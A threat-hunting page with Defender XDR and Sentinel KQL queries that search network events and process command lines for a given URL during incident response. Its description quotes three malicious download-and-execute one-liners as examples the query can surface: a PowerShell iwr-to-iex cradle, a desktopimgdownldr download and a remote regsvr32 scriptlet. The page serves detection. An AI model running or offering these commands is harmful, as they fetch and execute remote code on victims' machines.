# URL Lookup (Network & Commandline)

## Query Information

#### Description
This query can be used to perform a URL lookup on both the DeviceNetworkEvents as well as the commandline references. This can help in incident investigations to quickly find all the related logs and commandline references of the IP address. The *LookupURL* is used to set a URL on which you want to look for. The query has also a setting that you can change to only show commandline results, thent he line *| where CommandLineReference == true* needs to be uncommented. The *LookupURL* can also be a devicename you want to lookup. 

Some examples below are stated, which will be shown based on the commandline lookup. Remote downloads or executions of files can be an indicator of malicious activity.
```
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"

set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr

cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat
```

#### References
- https://andreafortuna.org/2017/11/27/how-a-malware-can-download-a-remote-payload-and-execute-malicious-code-in-one-line/
- https://www.bleepingcomputer.com/news/security/windows-10-background-image-tool-can-be-abused-to-download-malware/
- https://lolbas-project.github.io/lolbas/Binaries/Cmd/

## Defender XDR
```
// Set the URL you are trying to lookup.
// Lookup in this query is done with a contains, if this results in to many false positives add www. before the rest of the url.
let LookupURL = "test.com";
let SearchWindow = 48h; //Customizable h = hours, d = days
// Collect all network evets to the RemoteIP
let NewtworkEvents = DeviceNetworkEvents
     | where Timestamp > ago(SearchWindow)
     | where RemoteUrl contains LookupURL
     | project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine, InitiatingProcessAccountSid;
// Collect all commandline references of the URL
let CommandLineReferences = DeviceProcessEvents
     | where Timestamp > ago(SearchWindow)
     | where ProcessCommandLine contains LookupURL
     | project Timestamp, DeviceName, ActionType, FolderPath, ProcessCommandLine, AccountSid;
// Combine results
(union isfuzzy=true
     (NewtworkEvents),
     (CommandLineReferences)
// If you do want to have raw logs remove the summarize below.
// CommandLines and RemoteURLs can both be empty if there is no Commandline reference and a connection is only made to a IP not to a URL.
     | summarize RemoteIPs = make_set(RemoteIP), CommandLines = make_set(ProcessCommandLine), LastMention = arg_max(Timestamp, *) by DeviceName
     // Add filter posibility to alter the search results if you only want to see commandline references. By default it includes both network and commandline references. If you only want to see commandline references uncommment the statment CommandLineReference == true
     | extend CommandLineReference = iff(CommandLines == @'[""]', false, true)
     //| where CommandLineReference == true
     | project-reorder LastMention, DeviceName, RemoteUrl
     | sort by LastMention
)
```
## Sentinel
```
// Set the URL you are trying to lookup.
// Lookup in this query is done with a contains, if this results in to many false positives add www. before the rest of the url.
let LookupURL = "test.com";
let SearchWindow = 48h; //Customizable h = hours, d = days
// Collect all network evets to the RemoteIP
let NewtworkEvents = DeviceNetworkEvents
     | where TimeGenerated > ago(SearchWindow)
     | where RemoteUrl contains LookupURL
     | project TimeGenerated, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine, InitiatingProcessAccountSid;
// Collect all commandline references of the URL
let CommandLineReferences = DeviceProcessEvents
     | where TimeGenerated > ago(SearchWindow)
     | where ProcessCommandLine contains LookupURL
     | project TimeGenerated, DeviceName, ActionType, FolderPath, ProcessCommandLine, AccountSid;
// Combine results
(union isfuzzy=true
     (NewtworkEvents),
     (CommandLineReferences)
// If you do want to have raw logs remove the summarize below.
// CommandLines and RemoteURLs can both be empty if there is no Commandline reference and a connection is only made to a IP not to a URL.
     | summarize RemoteIPs = make_set(RemoteIP), CommandLines = make_set(ProcessCommandLine), LastMention = arg_max(TimeGenerated, *) by DeviceName
     // Add filter posibility to alter the search results if you only want to see commandline references. By default it includes both network and commandline references. If you only want to see commandline references uncommment the statment CommandLineReference == true
     | extend CommandLineReference = iff(CommandLines == @'[""]', false, true)
     //| where CommandLineReference == true
     | project-reorder LastMention, DeviceName, RemoteUrl
     | sort by LastMention
)
```
